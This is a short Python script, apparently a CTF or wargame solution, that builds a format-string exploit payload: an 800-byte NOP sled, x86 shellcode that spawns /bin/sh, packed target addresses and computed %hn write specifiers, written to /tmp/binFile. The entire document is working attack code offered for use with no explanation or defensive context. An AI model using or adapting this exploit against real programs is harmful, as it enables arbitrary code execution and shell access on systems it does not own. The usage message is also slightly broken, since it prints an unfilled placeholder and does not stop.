import sys
import os
from struct import pack

shellcode = "\x90" * 800
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

argv = sys.argv

if len(argv) < 4:
   print("useage: %s <god address> <buf address> <index>")

god_addr = int(argv[1], 16)
buf_addr = argv[2]
index = int(argv[3])
length = len(shellcode) + 8


front_buf_addr = int(buf_addr[:6], 16)
rear_buf_addr = int(buf_addr[6:], 16) - (length + 16)

if front_buf_addr > rear_buf_addr:
   buf = pack('<I', god_addr)
   buf += pack('<I', god_addr+2)

   front_padd = rear_buf_addr - length
   rear_padd = front_buf_addr - rear_buf_addr
else:
   buf = pack('<I', god_addr+2)
   buf += pack('<I', god_addr)
   
   front_padd = front_buf_addr - length
   rear_padd = rear_buf_addr - front_buf_addr


buf += shellcode

buf += "%%%dx%%%d$hn" % (front_padd, index)
buf += "%%%dx%%%d$hn" % (rear_padd, index+1)

f = open("/tmp/binFile", "wb")
f.write(buf)
